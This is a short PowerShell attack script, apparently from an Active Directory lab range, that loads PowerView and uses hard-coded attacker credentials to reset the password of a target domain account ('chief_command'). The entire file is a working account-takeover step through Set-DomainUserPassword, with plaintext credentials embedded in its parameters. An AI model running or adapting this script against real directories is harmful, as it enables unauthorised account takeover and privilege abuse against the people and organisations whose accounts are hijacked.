param(
    [string]$TargetUser = 'chief_command',
    [string]$DomainRoot = 'cadre.local',
    [string]$AttackUser = 'hunter_dfir',
    [string]$AttackPassword = 'DF1R_Hunt3r!'
)

$ErrorActionPreference = 'Stop'

$sec = New-Object System.Management.Automation.PSCredential("$DomainRoot\$AttackUser", (ConvertTo-SecureString $AttackPassword -AsPlainText -Force))
$pv = 'C:\Tools\cadre-attack\PowerView.ps1'
if (-not (Test-Path $pv)) { throw "PowerView.ps1 not found at $pv" }
. $pv

Write-Output "=== TRIAL: Set-DomainUserPassword ==="
try {
  Set-DomainUserPassword -Identity $TargetUser -AccountPassword (ConvertTo-SecureString 'RedStrike_T015!' -AsPlainText -Force) -Domain $DomainRoot -Credential $sec -Verbose 2>&1 | ForEach-Object { Write-Output $_ }
  Write-Output "SETPWD_OK"
} catch {
  Write-Output "SETPWD_FAIL: $_"
}
